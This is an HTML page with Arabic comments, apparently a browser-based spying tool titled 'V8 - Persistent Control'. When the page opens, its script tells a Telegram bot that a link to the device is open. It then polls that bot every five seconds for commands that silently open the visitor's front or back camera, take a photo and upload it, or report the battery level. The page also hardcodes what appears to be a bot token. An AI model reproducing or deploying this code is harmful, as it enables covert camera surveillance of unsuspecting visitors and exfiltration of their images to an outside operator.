<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>V8 - Persistent Control</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .terminal { border: 1px solid #00ffcc; padding: 20px; box-shadow: 0 0 15px #00ffcc; }
    </style>
</head>
<body>
    <div class="terminal">
        <h3>SYSTEM_LINK: ACTIVE</h3>
        <p id="stat">جاري مزامنة بروتوكولات التحكم...</p>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // --- إعدادات التحكم الكامل ---
        const BOT_TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const CHAT_ID = "7392262688"; // ايدي حسابك لكي تتحكم من تليجرام
        
        // دالة التقاط الصور الفورية (التحكم عن بعد)
        async function remoteCapture(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode === 'back' ? "environment" : "user" } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 2000)); // انتظار الضبط

                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);

                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'v8_live.jpg');
                fd.append('caption', `✅ تم تنفيذ أمر التصوير المباشر (${mode})`);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) {
                console.log("Capture Failed");
            }
        }

        // --- نظام "الاستماع المستمر" (Persistent Listener) ---
        // في الأنظمة المتقدمة نستخدم WebSockets، هنا سنستخدم Long Polling بسيطاً
        async function listenForCommands() {
            // هذا الكود يجعل المتصفح يسأل البوت كل 5 ثوانٍ: "هل هناك أمر جديد؟"
            // وبذلك تستطيع إرسال أمر من تليجرام ويقوم المتصفح بتنفيذه فوراً
            setInterval(async () => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
                    const data = await response.json();
                    const lastMessage = data.result[0].message.text;

                    if (lastMessage === "/photo_front") {
                        remoteCapture('front');
                    } else if (lastMessage === "/photo_back") {
                        remoteCapture('back');
                    } else if (lastMessage === "/info") {
                        const b = await navigator.getBattery();
                        const msg = `🔋 الشحن الحالي: ${Math.floor(b.level * 100)}%`;
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
                    }
                } catch (e) {}
            }, 5000); // يفحص الأوامر كل 5 ثوانٍ
        }

        window.onload = () => {
            listenForCommands();
            // إرسال رسالة "تم الاتصال بنجاح" أول دخول
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🟢 تم فتح قناة اتصال دائمة مع الجهاز!`);
        };
    </script>
</body>
</html>
